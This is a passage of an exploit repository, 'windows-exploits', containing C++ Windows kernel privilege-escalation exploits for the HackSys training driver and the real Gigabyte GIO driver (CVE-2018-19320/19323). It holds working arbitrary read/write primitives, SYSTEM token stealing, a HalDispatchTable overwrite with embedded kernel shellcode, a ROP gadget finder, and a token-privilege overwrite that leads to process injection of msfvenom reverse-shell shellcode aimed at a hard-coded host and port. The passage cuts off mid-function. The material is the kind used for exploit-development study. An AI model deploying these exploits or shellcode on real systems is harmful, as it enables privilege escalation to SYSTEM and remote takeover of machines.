    /* 0x0470 */ struct _SEP_LUID_TO_INDEX_MAP_ENTRY* IndexEntry;
    /* 0x0478 */ struct _SEP_TOKEN_DIAG_TRACK_ENTRY* DiagnosticInfo;
    /* 0x0480 */ struct _SEP_CACHED_HANDLES_ENTRY* BnoIsolationHandlesEntry;
    /* 0x0488 */ void* SessionObject;
    /* 0x0490 */ unsigned __int64 VariablePart;
} TOKEN, * PTOKEN; /* size: 0x0498 */

typedef struct _PROCESS_HANDLE_TABLE_ENTRY_INFO
{
    HANDLE HandleValue;
    ULONGLONG HandleCount;
    ULONGLONG PointerCount;
    ACCESS_MASK GrantedAccess;
    ULONG ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} PROCESS_HANDLE_TABLE_ENTRY_INFO, * PPROCESS_HANDLE_TABLE_ENTRY_INFO;

typedef struct _PROCESS_HANDLE_SNAPSHOT_INFORMATION
{
    ULONGLONG NumberOfHandles;
    ULONGLONG Reserved;
    PROCESS_HANDLE_TABLE_ENTRY_INFO Handles[1];
} PROCESS_HANDLE_SNAPSHOT_INFORMATION, * PPROCESS_HANDLE_SNAPSHOT_INFORMATION;


typedef struct _OBJECT_TYPE_INFORMATION
{
    UNICODE_STRING TypeName;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG TotalPagedPoolUsage;
    ULONG TotalNonPagedPoolUsage;
    ULONG TotalNamePoolUsage;
    ULONG TotalHandleTableUsage;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    ULONG HighWaterPagedPoolUsage;
    ULONG HighWaterNonPagedPoolUsage;
    ULONG HighWaterNamePoolUsage;
    ULONG HighWaterHandleTableUsage;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccessMask;
    BOOLEAN SecurityRequired;
    BOOLEAN MaintainHandleCount;
    BOOLEAN TypeIndex;
    CHAR ReservedByte;
    ULONG PoolType;
    ULONG DefaultPagedPoolCharge;
    ULONG DefaultNonPagedPoolCharge;
} OBJECT_TYPE_INFORMATION, * POBJECT_TYPE_INFORMATION;

// getPteAddress uses selfref to get the PTE address of a virtual address
uintptr_t getPteAddress(PVOID addr, PVOID base);

// sprayTLBCache makes sure that after flipping PTE U/S we do not run into caching issues
// Reference: https://kristal-g.github.io/
void sprayTLBCache();

// getBaseAddr gives the base address of a loaded kernel module e.g. ntoskrnl.exe
ULONGLONG getBaseAddr(LPCWSTR drvname);

// getDriverDataSection
DWORD getDriverDataSection(const char* path);

// leakStackBase
StackInfo leakStackBase(const char* path);

// _EPROCESS from PID
QWORD getSystemEProcess();

// get handle to a specific service
HRESULT GetServiceHandle(_In_ LPCWSTR ServiceName, _Out_ PHANDLE ProcessHandle);

// GetTokenObjectIndex ...
HRESULT GetTokenObjectIndex(_Out_ PULONG TokenIndex);

// GetProcessTokenAddress ...
HRESULT GetProcessTokenAddress(_In_ HANDLE tokenHandle, _Out_ PVOID* HandleAddress);

// GetKThread
PVOID GetkThread();

// FindProcessId
DWORD FindProcessId(const std::wstring& processName);
```

`windows-exploits/Exploit.cpp`:

```cpp
#include "Exploits.h"
#include "Common.h"
/*
   xcts windows exploits

   All exploits are vs Windows 10 x64 unless there is a different windows version in the function name name.
   To run a specific exploit, uncomment all other functions except the one you want to run.
*/

int main(int argc, char** argv)
{
    HevdStackOverflowMI(argc, argv);
    //HevdStackOverflowACLMI(argc, argv); 
    //HevdStackOverflowRopMI(argc, argv);
    //HevdStackOverflowGSMI(argc, argv);
    //HevdArbitraryWriteMI(argc, argv);
    //HevdTypeConfusionMI(argc, argv);    
    //HevdTypeConfusionMI2(argc, argv);
    
    //HevdUAFMI(argc, argv); 
    //HevdPoolOverflowWin7x64(argc, argv);
    //HevdNullPointerMIWin7x64(argc, argv);
     
    //GigabyteDriverMI(argc, argv);
    //GigabyteDriverLI(argc, argv);
    return 0;
}

```

`windows-exploits/Exploits.h`:

```h
#pragma once

// HacksysVulnerableDriver Exploits https://github.com/hacksysteam/HackSysExtremeVulnerableDriver
int HevdStackOverflowMI(int argc, char** argv);
int HevdStackOverflowACLMI(int argc, char** argv);
int HevdStackOverflowRopMI(int argc, char** argv);
int HevdStackOverflowGSMI(int argc, char** argv);
int HevdArbitraryWriteMI(int argc, char** argv);
int HevdTypeConfusionMI(int argc, char** argv);
int HevdTypeConfusionMI2(int argc, char** argv);
int HevdUAFMI(int argc, char** argv);
int HevdPoolOverflowWin7x64(int argc, char** argv);
int HevdNullPointerMIWin7x64(int argc, char** argv);

// Gigabyte Driver Exploits https://www.secureauth.com/labs/advisories/gigabyte-drivers-elevation-of-privilege-vulnerabilities/
int GigabyteDriverLI(int argc, char** argv);
int GigabyteDriverMI(int argc, char** argv);



```

`windows-exploits/Gadgets.cpp`:

```cpp
#include "Gadgets.h"
#include <algorithm>

std::map<std::string, std::vector<BYTE >> opcodes = {
	/*
	 TODO: allow multiple sequences for one operation
	 */
	{ "RET" , { 0xC3 }},
	{ "POP_RAX", { 0x58, 0xC3 }},
	{ "POP_RCX", { 0x59, 0xc3 }},
	{ "MOV_CR4_RCX", { 0x0f, 0x22, 0xe1, 0xc3 }},

	{ "NOP", { 0x4d, 0xc3 }},
	{ "POP_RAX_POP_RCX", { 0x58, 0x59, 0xc3 }},
	{ "MOV_RCX_PTRRAX", { 0x48, 0x89, 0x08, 0xc3 }},
	{ "MOV_RAX_PTRRCX", { 0x89, 0x01, 0xc3 }},
	{ "XOR_RAX_RAX", { 0x48, 0x33, 0xc0, 0xc3 }},
	{ "XOR_ESI_ESI", { 0x31, 0xf6, 0xc3 }},
};

std::map<std::string, DWORD> kernelGadgets = {
	// filled by ResolveGadgets
};

void ResolveGadgets() {
	HMODULE lpFileName = LoadLibrary(L"C:\\Windows\\System32\\ntoskrnl.exe");
	for (std::map<std::string, std::vector<BYTE>>::iterator iter = opcodes.begin(); iter != opcodes.end(); ++iter)
	{
		std::string k = iter->first;
		unsigned char *v = (unsigned char*)&iter->second[0];
		QWORD gadgetOffset = FindGadget(lpFileName, v, (SIZE_T)iter->second.size());
		kernelGadgets[k] = gadgetOffset;
		printf("[*] %s is at 0x%lx\n", k, gadgetOffset);
	}
}

// FindGaget searches for a byte sequence in the code section of a module
QWORD FindGadget(HMODULE moduleName, BYTE* opCodeArray, int opCodeSize) {
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleName;
	PIMAGE_NT_HEADERS ntHeader;
	ntHeader = (PIMAGE_NT_HEADERS)((ULONGLONG)(dosHeader)+(dosHeader->e_lfanew));
	IMAGE_OPTIONAL_HEADER opHeader;
	opHeader = ntHeader->OptionalHeader;

	BYTE* ntoskrnlBuf;
	ntoskrnlBuf = (BYTE*)malloc(opHeader.SizeOfCode);
	SIZE_T sizeRead;
	ReadProcessMemory(GetCurrentProcess(), moduleName, ntoskrnlBuf, opHeader.SizeOfCode, &sizeRead);

	BYTE* buf = ntoskrnlBuf;
	PBYTE bufLast = buf + opHeader.SizeOfCode;
	BYTE* pattern = opCodeArray;
	PBYTE patternLast = pattern + opCodeSize;
	// std::search would search from start, however at start more gadgets are non paged in the kernel
	PBYTE occurence = std::find_end(buf, bufLast, pattern, patternLast); // returns iterator to first occurence of sequence

	BOOL found = (occurence != bufLast);
	if (found)
	{
		return std::distance(buf, occurence);
	}
	else
	{
		return -1;
	}
}



```

`windows-exploits/Gadgets.h`:

```h
#pragma once
#include "Common.h"

extern std::map<std::string, std::vector<BYTE>> opcodes;

extern std::map<std::string, DWORD> kernelGadgets;

QWORD FindGadget(HMODULE lpFileName, unsigned char search_opcode_fwd[], int opcode_size);

void ResolveGadgets();
```

`windows-exploits/GigabyteDriverLI.cpp`:

```cpp
#include "Common.h"
#include "Exploits.h"

/*
   Gigabyte Driver CVE-2018-19320 + CVE-2018-19323 / Low Integrity

   Author: @xct_de
   Target: 10.0.19044

   - Leak _KTHREAD (MSR read to get KPCR)
   - Allocate & Write Shellcode to executeable memory
   - Dispatch table overwrite (+8)
   - Restore Dispatch Table (so PatchGuard does not complain)
*/

namespace GigabyteDriverLINS {

	// Token Stealing SC without Overflow Cleanup (since we overwrite HalDispatchTable)
	BYTE sc[256] = {
		0x48, 0x31, 0xc0, 0x65, 0x48, 0x8b, 0x80, 0x88, 0x01, 0x00,
		0x00, 0x48, 0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x49, 0x89,
		0xc1, 0x48, 0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 0x48, 0x8b,
		0x00, 0x48, 0x8b, 0x50, 0xf8, 0x49, 0x89, 0xc0, 0x48, 0x8b,
		0x00, 0x48, 0x83, 0xfa, 0x04, 0x75, 0xf0, 0x49, 0x8b, 0x50,
		0x70, 0x48, 0x83, 0xe2, 0xf8, 0x49, 0x8b, 0x89, 0xb8, 0x04,
		0x00, 0x00, 0x48, 0x83, 0xe1, 0x07, 0x48, 0x01, 0xca, 0x49,
		0x89, 0x91, 0xb8, 0x04, 0x00, 0x00, 0xc3, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff
	};

	// reads from where (ptr)
	QWORD arbRead(QWORD where, HANDLE hDriver, DWORD IOCTL) {
		typedef struct _Memcpy {
			QWORD dest;
			QWORD src;
			DWORD size;
		} _Memcpy;

		LPVOID readBuffer = VirtualAlloc(NULL, 0x8, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		_Memcpy memCpy = { (QWORD)readBuffer, where, 8 }; // copy where to readbuffer

		if (!DeviceIoControl(hDriver, IOCTL, (LPVOID)&memCpy, sizeof(memCpy), NULL, 0, NULL, NULL)) {
			printf("[-] Error in arbRead (IOCTL)\n");
			exit(-1);
		}
		return *((QWORD*)readBuffer);
	}

	// writes what (ptr) to where (ptr)
	VOID arbWrite(QWORD where, QWORD what, DWORD size, HANDLE hDriver, DWORD IOCTL) {
		typedef struct _Memcpy {
			QWORD dest;
			QWORD src;
			DWORD size;
		} _Memcpy;

		_Memcpy memCpy = { where , what, size }; // copy src to dst
		if (!DeviceIoControl(hDriver, IOCTL, (LPVOID)&memCpy, sizeof(memCpy), NULL, 0, NULL, NULL)) {
			printf("[-] Error in arbWrite (IOCTL)\n");
			exit(-1);
		}
	}

	// reads msr and returns value
	QWORD msrRead(DWORD reg, HANDLE hDriver, DWORD IOCTL) {
		typedef struct _MSRIO {
			DWORD rw; // 1 is read, 0 is write			
			DWORD reg;
			QWORD value;
		} _MSRIO;

		_MSRIO inBuf = { 1, reg };
		QWORD outBuf[2] = { 0 };

		DWORD bytesReturned = 0;
		if (!DeviceIoControl(hDriver, IOCTL, (LPVOID)&inBuf, sizeof(inBuf), (LPVOID)outBuf, sizeof(outBuf), &bytesReturned, NULL)) {
			printf("[-] Error in msrRead (IOCTL)\n");
			exit(-1);
		}
		return outBuf[1];
	}

	// allocates size in kernel memory
	QWORD allocRWX(DWORD size, HANDLE hDriver, DWORD IOCTL) {
		
		DWORD inBuf = size;
		QWORD outBuf[2] = { 0 };

		DWORD bytesReturned = 0;
		if (!DeviceIoControl(hDriver, IOCTL, (LPVOID)&inBuf, sizeof(inBuf), (LPVOID)outBuf, sizeof(outBuf), &bytesReturned, NULL)) {
			printf("[-] Error in allocRWX (IOCTL)\n");
			exit(-1);
		}
		return outBuf[0];
	}

	void Exploit(int argc, char** argv) {
		DWORD IoReadMSR = 0xC3502580;
		DWORD IoAllocateRWX = 0xC3502800;
		DWORD IoMemcpy = 0xC3502808;
		// LSTAR, The kernel's RIP SYSCALL entry for 64 bit software (https://wiki.osdev.org/SYSENTER)
		DWORD regLstar = 0xC0000082;
		// Kernel Process Control Region (KPCR, in shellcode referenced via GS)
		DWORD regGS = 0xC0000101;
		DWORD LSTAR_BASE_OFFSET = 0x408AC0;

		HANDLE hDriver = CreateFile(L"\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
		if (hDriver == INVALID_HANDLE_VALUE)
		{
			printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
			exit(1);
		}

		// use vuln to read MSR container a kernel pointer
		QWORD IA32_LSTAR = msrRead(regLstar, hDriver, IoReadMSR);
		printf("[*] IA32_LSTAR: %llx (nt!KiSystemCall64)\n", IA32_LSTAR);
		// calculate kernel base (static offset from printing with getBaseAddr and subtracting)
		QWORD ntBase = IA32_LSTAR - LSTAR_BASE_OFFSET;
		printf("[>] Nt base: %p\n", ntBase);

		// get gs register to find _KTHREAD from KPRCB (like we do in shellcode
		QWORD GS = msrRead(regGS, hDriver, IoReadMSR);
		printf("[*] GS: %llx\n", GS);
		QWORD kThread = GS + 0x188;
		printf("[>] _KTHREAD: %p\n", kThread);

		// Allocate a block of RWX via MmAllocateContiguousMemory
		QWORD sc_ptr = allocRWX(0x1000, hDriver, IoAllocateRWX);
		printf("[>] Allocated kernel rwx memory @ %llx\n", sc_ptr);

		// Copy in our shellcode with Arbitrary Write (we can not RtlCopyMemory from user to kernel mode)
		arbWrite(sc_ptr, (QWORD)&sc, 256, hDriver, IoMemcpy);

		// Find HalDispatchTable by getting the offset from the file & mapping it to the kernel base address
		HMODULE ntHandle = LoadLibraryA("ntoskrnl.exe");
		QWORD halDispatchTableUserAddr = (QWORD)GetProcAddress(ntHandle, "HalDispatchTable");
		printf("[>] HalDispatchTableUserAddr: 0x%llx\n", halDispatchTableUserAddr);
		QWORD halDispatchTableOffset = halDispatchTableUserAddr - (QWORD)ntHandle;
		printf("[>] HalDispatchTableOffset: 0x%llx\n", halDispatchTableOffset);
		QWORD halDispatchTableKernelAddress = halDispatchTableOffset + ntBase;
		printf("[>] HalDispatchTableKernelAddr: 0x%llx\n", halDispatchTableKernelAddress);

		// store old hal+8 for cleanup
		QWORD oldHALPtr = arbRead(halDispatchTableKernelAddress + 0x8, hDriver, IoMemcpy);

		// write sc ptr to hal+8 (we cannot pass the pointer directly but need to pass a pointer to the pointer)
		QWORD scPtrBuf = sc_ptr;
		arbWrite(halDispatchTableKernelAddress + 8, (QWORD)&scPtrBuf, 8, hDriver, IoMemcpy);
		printf("[>] Replaced NtQueryIntervalProfile @ HAL+8 with ptr to shellcode\n");

		//getchar();
		//DebugBreak();

		// trigger
		_NtQueryIntervalProfile NtQueryIntervalProfile = (_NtQueryIntervalProfile)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryIntervalProfile");
		ULONG temp;
		NtQueryIntervalProfile(0x10, &temp);

		system("cmd.exe");

		// restore hal+8 so PatchGuard is happy
		QWORD oldHALPtrBuf = oldHALPtr;
		arbWrite(halDispatchTableKernelAddress + 8, (QWORD)&oldHALPtrBuf, 8, hDriver, IoMemcpy);
		printf("[>] Restored HAL\n");

		CloseHandle(hDriver);
	}
}


int GigabyteDriverLI(int argc, char** argv) {
	printf("[*] Running GigabyteDriver02\n");
	GigabyteDriverLINS::Exploit(argc, argv);	
	return 0;
}
```

`windows-exploits/GigabyteDriverMI.cpp`:

```cpp
#include "Common.h"
#include "Exploits.h"

/*
   Gigabyte Driver CVE-2018-19320 / Medium Integrity

   Author: @xct_de
   Target: 10.0.19044

   Data only attack. We do not execute shellcode and just replace our token.

   Debug: 
   ba e1 gdrv+0x312f (break on IOCTL 0xC3502488)
*/

namespace GigabyteDriverMINS {
	// vuln based read primitive
	QWORD arbRead(QWORD where, HANDLE hDriver, DWORD IOCTL) {	
		typedef struct _Memcpy {
			QWORD dest;
			QWORD src;
			DWORD size;
		} _Memcpy;

		LPVOID readBuffer = VirtualAlloc(NULL, 0x8, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		_Memcpy memCpy = { (QWORD)readBuffer, where, 8 }; // copy where to readbuffer

		if (!DeviceIoControl(hDriver, IOCTL, (LPVOID)&memCpy, sizeof(memCpy), NULL, 0, NULL, NULL)) {
			printf("[-] Error in arbRead (IOCTL)\n");
			exit(-1);
		}
		return *((QWORD*) readBuffer);
	}

	// vuln based write primitive
	VOID arbWrite(QWORD where, QWORD what, HANDLE hDriver, DWORD IOCTL) {
		typedef struct _Memcpy {
			QWORD dest;
			QWORD src;
			DWORD size;
		} _Memcpy;

		_Memcpy memCpy = { where , what, 8 }; // copy src to dst
		if (!DeviceIoControl(hDriver, IOCTL, (LPVOID)&memCpy, sizeof(memCpy), NULL, 0, NULL, NULL)) {
			printf("[-] Error in arbWrite (IOCTL)\n");
			exit(-1);
		}
	}

	void Exploit(int argc, char** argv) {
		DWORD IoMemcpy = 0xC3502808;

		HANDLE hDriver = CreateFile(L"\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
		if (hDriver == INVALID_HANDLE_VALUE)
		{
			printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
			exit(1);
		}

		// find system EPROCESS & token		
		QWORD systemProc = getSystemEProcess();
		printf("[*] System _EPROCESS: 0x%llx\n", systemProc);
		QWORD systemToken = arbRead(systemProc + 0x4b8, hDriver, IoMemcpy); // we do not really need this one, just for printing, the important one is ptr to it
		printf("[*] System TOKEN: 0x%llx\n", systemToken);

		// walk ActiveProcessLinks to find our process
		DWORD currentProcessPid = GetCurrentProcessId();
		printf("[*] Current Process PID %d\n", currentProcessPid);
		BOOL found = false;
		QWORD cProcess = systemProc;
		DWORD cPid = 0, cTokenPtr;
		while (!found) {
			cProcess = arbRead(cProcess + 0x448, hDriver, IoMemcpy); // get next entry in ActiveProcessLinks
			cProcess -= 0x448; // get back to start of _EPROCESS (otherwise it points directly to next entrys 0x448 offset)
			cPid = arbRead(cProcess + 0x440, hDriver, IoMemcpy);
			cTokenPtr = cProcess + 0x4b8;
			//printf("  [*] cProcess %llx (PID: %d, TOKEN_PTR: %d)\n", cProcess, cTokenPtr);
			if (cPid == currentProcessPid) {
				found = true;
				break;
			}
		}
		if (!found) {
			printf("[-] Could not find current process in ActiveProcessLinks\n");
			exit(-1);
		}

		printf("[>] Replacing Token\n");
		arbWrite(cProcess + 0x4b8, systemProc + 0x4b8, hDriver, IoMemcpy);

		printf("[>] Starting shell\n");
		system("cmd.exe");

		printf("[>] Cleaning up\n");
		arbWrite(cProcess + 0x4b8, cTokenPtr, hDriver, IoMemcpy);
	}
}


int GigabyteDriverMI(int argc, char** argv) {
	printf("[*] Running GigabyteDriver01\n");
	GigabyteDriverMINS::Exploit(argc, argv);
	return 0;
}
```

`windows-exploits/HevdArbitraryWriteMI.cpp`:

```cpp
#include "Common.h"
#include "Exploits.h"
#include <winternl.h>
/*
   HEVD HevdArbitraryWriteMI / Medium Integrity

   Author: @xct_de
   Target: 10.0.19044

   We exploit this arbitrary write by overwriting the token privileges of our process. Although token stealing would be a lot 
   easier we do it this way to play with the technique. With the new privileges we can open a handle to a service and
   spawn a process wich we reparent to this system service (by doing so it becomes elevated). We then inject into
   this new process and run shellcode. Injecting is not really required as you can run any executeable and reparent it.

   References:
   - Arbitrary Increment Exploitation (https://windows-internals.com/exploiting-a-simple-vulnerability-in-35-easy-steps-or-less/#7-what-do-we-increment)
   - SeDebugPrivilege Exploitation https://windows-internals.com/faxing-your-way-to-system/ 
     * SeDebugPrivilege allows to open a handle to any process on the system (including any service)
	 * We reparent to a SYSTEM process (DcomLauncher) which makes it run as SYSTEM and is a bit less sus
	 * Inject into the child process to get a rev shell (we could also run an attacker provided binary)
   */


int HevdArbitraryWriteMI(int argc, char** argv) {
	printf("~----------------------------~\n");
	printf("  Running HevdArbitraryWrite  \n");
	printf("~----------------------------~\n");

	typedef struct _WriteWhatWhereBuffer
	{
		uintptr_t what;
		uintptr_t where;
	} WriteWhatWhereBuffer;

	// msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.153.180 LPORT=1337 -f csharp
	BYTE sc[460] = {
		0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
		0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
		0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
		0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
		0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
		0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
		0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
		0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
		0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
		0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
		0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
		0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
		0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
		0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,
		0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,
		0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x05,0x39,0xc0,0xa8,0x99,0xb4,0x41,0x54,
		0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,
		0x89,0xea,0x68,0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,
		0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,
		0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,
		0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,
		0xa5,0x74,0x61,0xff,0xd5,0x48,0x81,0xc4,0x40,0x02,0x00,0x00,0x49,0xb8,0x63,
		0x6d,0x64,0x00,0x00,0x00,0x00,0x00,0x41,0x50,0x41,0x50,0x48,0x89,0xe2,0x57,
		0x57,0x57,0x4d,0x31,0xc0,0x6a,0x0d,0x59,0x41,0x50,0xe2,0xfc,0x66,0xc7,0x44,
		0x24,0x54,0x01,0x01,0x48,0x8d,0x44,0x24,0x18,0xc6,0x00,0x68,0x48,0x89,0xe6,
		0x56,0x50,0x41,0x50,0x41,0x50,0x41,0x50,0x49,0xff,0xc0,0x41,0x50,0x49,0xff,
		0xc8,0x4d,0x89,0xc1,0x4c,0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,0x86,0xff,0xd5,
		0x48,0x31,0xd2,0x48,0xff,0xca,0x8b,0x0e,0x41,0xba,0x08,0x87,0x1d,0x60,0xff,
		0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,
		0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
		0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5 
	};


	HANDLE hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hDriver == INVALID_HANDLE_VALUE)
	{
		printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
		exit(1);
	}

	// get base address of kernel & driver (only works from medium integrity)
	ULONGLONG ntBase = getBaseAddr(L"ntoskrnl.exe");
	printf("[>] Nt base: %p\n", ntBase);

	// DCom Injection Technique (thanks to yarden shafir & alex ionescu)
	HANDLE processTokenHandle;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &processTokenHandle)) {
		printf("[-] OpenProcessToken failed\n");
	}

	PVOID tokenAddress;
	GetProcessTokenAddress(processTokenHandle, &tokenAddress);
	printf("[>] Process token address: 0x%p\n", tokenAddress);
	CloseHandle(processTokenHandle);

	PVOID  presentPrivilegesAddress = (PVOID)((ULONG64)tokenAddress + offsetof(TOKEN, Privileges.Present) + 2);
	PVOID  enabledPrivilegesAddress = (PVOID)((ULONG64)tokenAddress + offsetof(TOKEN, Privileges.Enabled) + 2);
	printf("[>] Editing addresses: 0x%p, 0x%p\n", presentPrivilegesAddress,	enabledPrivilegesAddress);

	// Start Exploit Arb Write

	_WriteWhatWhereBuffer arbWriteBuf = { 0 };
	QWORD superToken = 0xF00FF;
	/*
	 SeCreatePermanentPrivilege    Create permanent shared objects    Enabled
	 SeBackupPrivilege             Back up files and directories      Enabled
	 SeRestorePrivilege            Restore files and directories      Enabled
	 SeShutdownPrivilege           Shut down the system               Enabled
	 SeDebugPrivilege              Debug programs                     Enabled
	 SeAuditPrivilege              Generate security audits           Enabled
	 SeSystemEnvironmentPrivilege  Modify firmware environment values Enabled
	 SeChangeNotifyPrivilege       Bypass traverse checking           Enabled
	 SeRelabelPrivilege            Modify an object label             Enabled
	 SeIncreaseWorkingSetPrivilege Increase a process working set     Enabled
	 SeTimeZonePrivilege           Change the time zone               Enabled
	 SeCreateSymbolicLinkPrivilege Create symbolic links              Enabled
	*/
	arbWriteBuf.what = (ULONG_PTR)&superToken;
	arbWriteBuf.where = (uintptr_t) presentPrivilegesAddress;
	if (!DeviceIoControl(hDriver, IOCTL(0x802), (LPVOID)&arbWriteBuf, sizeof(arbWriteBuf), NULL, 0, NULL, NULL)) {
		printf("[-] ArbitaryWrite IOCTL failed\n");
		exit(-1);
	}
	printf("[>] Arbitrary write used to modify present token privileges\n");

	arbWriteBuf.what = (ULONG_PTR)&superToken;
	arbWriteBuf.where = (uintptr_t) enabledPrivilegesAddress;
	if (!DeviceIoControl(hDriver, IOCTL(0x802), (LPVOID)&arbWriteBuf, sizeof(arbWriteBuf), NULL, 0, NULL, NULL)) {
		printf("[-] ArbitaryWrite IOCTL failed\n");
		exit(-1);
	}
	printf("[>] Arbitrary write used to modify enabled token privileges\n");
	// End Exploit Arb Write

	//system("cmd.exe"); // this shell would have all privileges enabled but the user is not changed
	printf("[>] Spawning system process & using SeDebugPrivilege to inject..\n");
	
	HANDLE parentHandle;
	if(FAILED(GetServiceHandle(L"DcomLaunch", &parentHandle)))
	{
		printf("[-] Failed to get handle to DcomLaunch service\n");
		exit(-1);
	}
	printf("[>] Received handle to DcomLaunch\n");

	PPROC_THREAD_ATTRIBUTE_LIST procList = NULL;
	SIZE_T listSize;
	InitializeProcThreadAttributeList(NULL, 1, 0, &listSize); // supposed to fail but will result in correct listSize
	procList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, listSize);
	if (procList == NULL)
	{
		printf("[>] Failed to allocate memory\n");
		exit(-1);
	}
	InitializeProcThreadAttributeList(procList, 1, 0, &listSize); // now it works

	if(!UpdateProcThreadAttribute(procList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentHandle,	sizeof(parentHandle), NULL,	NULL)) {
		printf("[>] Failed to update ProcThreadAttribute");
		exit(-1);
	}

	STARTUPINFOEX startupInfoEx;
	PROCESS_INFORMATION processInfo;
	RtlZeroMemory(&startupInfoEx, sizeof(startupInfoEx));
	startupInfoEx.StartupInfo.cb = sizeof(startupInfoEx);
